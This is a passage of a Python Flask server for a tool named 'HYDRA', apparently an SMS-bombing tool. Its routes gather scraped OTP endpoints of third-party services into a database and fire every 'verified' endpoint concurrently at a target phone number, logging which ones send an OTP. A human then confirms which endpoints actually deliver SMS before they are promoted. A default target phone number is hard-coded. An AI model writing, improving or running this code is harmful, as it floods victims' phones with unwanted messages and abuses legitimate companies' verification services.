                        scraped = json.load(f).get("new_endpoints", []) or []
                source_used = f"local-scrape ({len(scraped)} endpoints)"

        with open(_TARGETS_FILE, "r", encoding="utf-8") as f:
            db = json.load(f)

        existing_urls = set(
            e.get("url") for e in (
                db.get("verified", []) + db.get("candidates", []) + db.get("dead", [])
            )
        )

        candidates = db.setdefault("candidates", [])
        added = 0
        sample_added: list[str] = []
        for ep in scraped:
            if ep.get("url") and ep.get("url") not in existing_urls:
                candidates.append({
                    "name": ep.get("name", "AutoScraped"),
                    "url": ep.get("url"),
                    "method": ep.get("method", "POST"),
                    "headers": ep.get("headers", {}),
                    "source": ep.get("source", "community"),
                })
                existing_urls.add(ep.get("url"))
                added += 1
                if len(sample_added) < 5:
                    sample_added.append(ep.get("name", ep.get("url")))

        with open(_TARGETS_FILE, "w", encoding="utf-8") as f:
            json.dump(db, f, indent=4)

        return jsonify({
            "status": "success",
            "added": added,
            "scanned": len(scraped),
            "source": source_used,
            "sample": sample_added,
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/api/pool")
def api_pool():
    """Return verified pool with per-endpoint metadata, enriched with latest retest results."""
    if not os.path.exists(_TARGETS_FILE):
        return jsonify({"verified": [], "candidates": [], "dead": [], "total": 0})
    with open(_TARGETS_FILE, encoding="utf-8") as f:
        db = json.load(f)
    verified = db.get("verified", [])

    # Build retest result lookup
    retest_map: dict[str, dict] = {}
    with _POOL_RETEST_LOCK:
        for r in _POOL_RETEST_STATE.get("results", []):
            retest_map[r.get("name", "")] = r

    enriched = []
    for ep in verified:
        entry = {k: v for k, v in ep.items()}
        if ep.get("name") in retest_map:
            r = retest_map[ep["name"]]
            entry["last_status"] = r.get("status")
            entry["last_otp"]    = r.get("otp_found")
            entry["last_ok"]     = r.get("ok")
            entry["last_ms"]     = r.get("ms")
        enriched.append(entry)

    with _POOL_RETEST_LOCK:
        retest_done  = _POOL_RETEST_STATE.get("done", False)
        retest_phone = _POOL_RETEST_STATE.get("phone", "")

    return jsonify({
        "verified":     enriched,
        "candidates":   db.get("candidates", []),
        "dead":         db.get("dead", []),
        "total":        len(verified),
        "retest_done":  retest_done,
        "retest_phone": retest_phone,
    })


def _run_pool_retest_bg(phone: str) -> None:
    """Background: fire ALL verified endpoints at phone, record timing + results."""
    with _POOL_RETEST_LOCK:
        _POOL_RETEST_STATE.update(running=True, done=False, phone=phone, results=[], logs=[])

    def plog(msg: str, lvl: str = "sys") -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        with _POOL_RETEST_LOCK:
            _POOL_RETEST_STATE["logs"].append({"t": ts, "msg": msg, "lvl": lvl})
        _log_queue.put({"t": ts, "msg": f"[POOL] {msg}", "lvl": lvl})

    if not os.path.exists(_TARGETS_FILE):
        plog("hydra_targets.json not found", "error")
        with _POOL_RETEST_LOCK:
            _POOL_RETEST_STATE["running"] = False
        return

    with open(_TARGETS_FILE, encoding="utf-8") as f:
        db = json.load(f)
    verified = db.get("verified", [])
    if not verified:
        plog("No verified endpoints in pool yet", "warn")
        with _POOL_RETEST_LOCK:
            _POOL_RETEST_STATE["running"] = False
        return

    plog(f"🔬 Retesting {len(verified)} verified endpoints at {phone[:4]}xxxxxx", "sys")

    def _fire_timed(ep: dict) -> dict:
        t0 = time.time()
        r  = _fire_candidate_once(ep, phone, timeout=8)
        r["ms"] = round((time.time() - t0) * 1000)
        return r

    results: list[dict] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futs = [ex.submit(_fire_timed, ep) for ep in verified]
        for fut in concurrent.futures.as_completed(futs):
            r = fut.result()
            results.append(r)
            if r.get("otp_found"):
                plog(f"✓ OTP   {r['name']}  {r.get('ms', 0)}ms", "success")
            elif r.get("ok"):
                plog(f"~ 200   {r['name']}  {r.get('ms', 0)}ms", "info")
            else:
                plog(f"✗ {r.get('status', 0):<5} {r['name']}", "warn")

    live_c = sum(1 for r in results if r.get("ok"))
    otp_c  = sum(1 for r in results if r.get("otp_found"))
    plog(f"Done — {otp_c} OTP keyword | {live_c} HTTP 200 | {len(verified) - live_c} down", "success")

    with _POOL_RETEST_LOCK:
        _POOL_RETEST_STATE.update(running=False, done=True, results=results)


@app.route("/api/pool/retest", methods=["POST"])
def api_pool_retest():
    with _POOL_RETEST_LOCK:
        if _POOL_RETEST_STATE.get("running"):
            return jsonify({"ok": False, "error": "Retest already running"})
    body  = request.get_json(force=True, silent=True) or {}
    phone = str(body.get("phone", "8777849865")).strip()
    if not (phone.isdigit() and len(phone) >= 10):
        phone = "8777849865"
    t = threading.Thread(target=_run_pool_retest_bg, args=(phone,), daemon=True, name="hydra-pool-retest")
    t.start()
    return jsonify({"ok": True})


@app.route("/api/pool/retest/status")
def api_pool_retest_status():
    with _POOL_RETEST_LOCK:
        return jsonify(dict(_POOL_RETEST_STATE))


@app.route("/api/pool/fire-single", methods=["POST"])
def api_pool_fire_single():
    """Fire one named endpoint at phone and return result immediately."""
    body  = request.get_json(force=True, silent=True) or {}
    name  = body.get("name", "")
    phone = str(body.get("phone", "8777849865")).strip()
    if not name or not os.path.exists(_TARGETS_FILE):
        return jsonify({"ok": False, "error": "Missing name or DB"})
    if not (phone.isdigit() and len(phone) >= 10):
        phone = "8777849865"
    with open(_TARGETS_FILE, encoding="utf-8") as f:
        db = json.load(f)
    ep = next((e for e in db.get("verified", []) if e.get("name") == name), None)
    if not ep:
        ep = next((e for e in db.get("candidates", []) if e.get("name") == name), None)
    if not ep:
        return jsonify({"ok": False, "error": "Endpoint not found in verified or candidate pool"})
    t0 = time.time()
    r  = _fire_candidate_once(ep, phone, timeout=8)
    r["ms"] = round((time.time() - t0) * 1000)
    return jsonify(r)


@app.route("/api/pool/retire", methods=["POST"])
def api_pool_retire():
    """Move a verified OR candidate endpoint → dead list (kept in DB so future hunts skip it)."""
    body = request.get_json(force=True, silent=True) or {}
    name = body.get("name", "")
    if not name or not os.path.exists(_TARGETS_FILE):
        return jsonify({"ok": False, "error": "Missing name or DB"})
    with open(_TARGETS_FILE, encoding="utf-8") as f:
        db = json.load(f)

    # Look in BOTH verified and candidates (user may reject either)
    found_in = None
    to_retire = []
    for section in ("verified", "candidates"):
        items = db.get(section, [])
        match = [ep for ep in items if ep.get("name") == name]
        if match:
            to_retire = match
            db[section] = [ep for ep in items if ep.get("name") != name]
            found_in = section
            break

    if not to_retire:
        return jsonify({"ok": False, "error": f"'{name}' not found in verified or candidates"})

    for ep in to_retire:
        ep["retired_date"] = datetime.now().strftime("%Y-%m-%d")
        ep["retired_from"] = found_in
    db.setdefault("dead", []).extend(to_retire)
    db.setdefault("_meta", {})["verified_count"] = len(db.get("verified", []))
    with open(_TARGETS_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=2, ensure_ascii=False)
    try:
        import hydra_v4 as _hv4
        _hv4.VERIFIED_TARGETS[:] = [t for t in _hv4.VERIFIED_TARGETS if t.get("name") != name]
        _state["api_count"] = len(_hv4.VERIFIED_TARGETS)
    except Exception:
        pass
    return jsonify({"ok": True, "retired": name, "from": found_in, "total_verified": len(db.get("verified", []))})


@app.route("/api/pool/delete-forever", methods=["POST"])
def api_pool_delete_forever():
    """Permanently remove an endpoint from ALL sections. Only callable after manual fire confirmed."""
    body = request.get_json(force=True, silent=True) or {}
    name = body.get("name", "")
    if not name or not os.path.exists(_TARGETS_FILE):
        return jsonify({"ok": False, "error": "Missing name or DB"})
    with open(_TARGETS_FILE, encoding="utf-8") as f:
        db = json.load(f)
    removed = 0
    for section in ("verified", "candidates", "dead"):
        before = len(db.get(section, []))
        db[section] = [ep for ep in db.get(section, []) if ep.get("name") != name]
        removed += before - len(db[section])
    if removed == 0:
        return jsonify({"ok": False, "error": "Not found in any section"})
    db.setdefault("_meta", {})["verified_count"] = len(db.get("verified", []))
    with open(_TARGETS_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=2, ensure_ascii=False)
    try:
        import hydra_v4 as _hv4
        _hv4.VERIFIED_TARGETS[:] = [t for t in _hv4.VERIFIED_TARGETS if t.get("name") != name]
        _state["api_count"] = len(_hv4.VERIFIED_TARGETS)
    except Exception:
        pass
    return jsonify({"ok": True, "deleted": name})


@app.route("/api/pool/bulk-delete", methods=["POST"])
def api_pool_bulk_delete():
    """Move multiple named endpoints from verified/candidates → dead."""
    body = request.get_json(force=True, silent=True) or {}
    names = body.get("names", [])
    if not names or not os.path.exists(_TARGETS_FILE):
        return jsonify({"ok": False, "error": "Missing names list or DB"})
    name_set = set(names)
    with open(_TARGETS_FILE, encoding="utf-8") as f:
        db = json.load(f)
    moved = 0
    for section in ("verified", "candidates"):
        items = db.get(section, [])
        to_move = [ep for ep in items if ep.get("name") in name_set]
        if to_move:
            for ep in to_move:
                ep["retired_date"] = datetime.now().strftime("%Y-%m-%d")
                ep["retired_from"] = section
            db[section] = [ep for ep in items if ep.get("name") not in name_set]
            db.setdefault("dead", []).extend(to_move)
            moved += len(to_move)
    db.setdefault("_meta", {})["verified_count"] = len(db.get("verified", []))
    with open(_TARGETS_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=2, ensure_ascii=False)
    try:
        import hydra_v4 as _hv4
        _hv4.VERIFIED_TARGETS[:] = [t for t in _hv4.VERIFIED_TARGETS if t.get("name") not in name_set]
        _state["api_count"] = len(_hv4.VERIFIED_TARGETS)
    except Exception:
        pass
    return jsonify({"ok": True, "moved": moved, "total_verified": len(db.get("verified", []))})


@app.route("/api/pool/purge-dead", methods=["POST"])
def api_pool_purge_dead():
    """Permanently wipe the entire dead list from the DB."""
    if not os.path.exists(_TARGETS_FILE):
        return jsonify({"ok": False, "error": "DB not found"})
    with open(_TARGETS_FILE, encoding="utf-8") as f:
        db = json.load(f)
    count = len(db.get("dead", []))
    db["dead"] = []
    with open(_TARGETS_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=2, ensure_ascii=False)
    return jsonify({"ok": True, "purged": count})


@app.route("/api/pool/promote", methods=["POST"])
def api_pool_promote():
    """Move a candidate endpoint → verified pool (human confirmed it sends SMS)."""
    body = request.get_json(force=True, silent=True) or {}
    name = body.get("name", "")
    if not name or not os.path.exists(_TARGETS_FILE):
        return jsonify({"ok": False, "error": "Missing name or DB"})
    with open(_TARGETS_FILE, encoding="utf-8") as f:
        db = json.load(f)
    candidates = db.get("candidates", [])
    to_promote = [ep for ep in candidates if ep.get("name") == name]
    remaining  = [ep for ep in candidates if ep.get("name") != name]
    if not to_promote:
        return jsonify({"ok": False, "error": "Not found in candidates"})
    for ep in to_promote:
        ep["confirm_date"]     = datetime.now().strftime("%Y-%m-%d")
        ep["human_confirmed"]  = True
        ep.pop("candidate_date", None)
    db["candidates"] = remaining
    db.setdefault("verified", []).extend(to_promote)
    db.setdefault("_meta", {})["verified_count"] = len(db["verified"])
    with open(_TARGETS_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=2, ensure_ascii=False)
    try:
        import hydra_v4 as _hv4
        _hv4.VERIFIED_TARGETS[:] = db["verified"]
        _state["api_count"] = len(_hv4.VERIFIED_TARGETS)
    except Exception:
        pass
    return jsonify({"ok": True, "promoted": name, "total_verified": len(db["verified"])})


@app.route("/api/pool/revive", methods=["POST"])
def api_pool_revive():
    """Revive an endpoint from dead/candidates → verified.
    Used when the user manually confirms a previously-rejected endpoint
    actually delivers SMS (e.g. confirmed by yesterday's phone messages)."""
    body = request.get_json(force=True, silent=True) or {}
    names = body.get("names") or ([body["name"]] if body.get("name") else [])
    names = [n for n in names if n]
    if not names or not os.path.exists(_TARGETS_FILE):
        return jsonify({"ok": False, "error": "Missing names or DB"})
    with open(_TARGETS_FILE, encoding="utf-8") as f:
        db = json.load(f)
    moved = []
    today = datetime.now().strftime("%Y-%m-%d")
    for section in ("dead", "candidates"):
        keep, take = [], []
        for ep in db.get(section, []):
            (take if ep.get("name") in names else keep).append(ep)
        for ep in take:
            ep.pop("dead_date", None)
            ep.pop("dead_reason", None)
            ep.pop("candidate_date", None)
            ep["confirm_date"]    = today
            ep["human_confirmed"] = True
            ep["revived"]         = True
            moved.append(ep)
        db[section] = keep
    if not moved:
        return jsonify({"ok": False, "error": "None of the requested names were found in dead/candidates"})
    # De-dupe vs already-verified (avoid double-add if called twice)
    verified = db.setdefault("verified", [])
    existing_names = {e.get("name") for e in verified}
    for ep in moved:
        if ep.get("name") not in existing_names:
            verified.append(ep)
            existing_names.add(ep.get("name"))
    db.setdefault("_meta", {})["verified_count"] = len(verified)
    with open(_TARGETS_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=2, ensure_ascii=False)
    try:
        import hydra_v4 as _hv4
        _hv4.VERIFIED_TARGETS[:] = verified
        _state["api_count"] = len(_hv4.VERIFIED_TARGETS)
    except Exception:
        pass
    return jsonify({"ok": True, "revived": [e.get("name") for e in moved], "total_verified": len(verified)})


# ─────────────────────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\033[92m[HYDRA SERVER] Starting on http://localhost:4040\033[0m")
    # Set HYDRA_DEV=1 to enable hot-reload on .py changes (Werkzeug reloader).
    _dev = os.environ.get("HYDRA_DEV", "").strip() in ("1", "true", "yes", "on")
    if _dev:
        print("\033[93m[HYDRA SERVER] HYDRA_DEV=1 — auto-reload on .py changes ENABLED\033[0m")
    app.run(host="0.0.0.0", port=4040, debug=False, threaded=True, use_reloader=_dev)
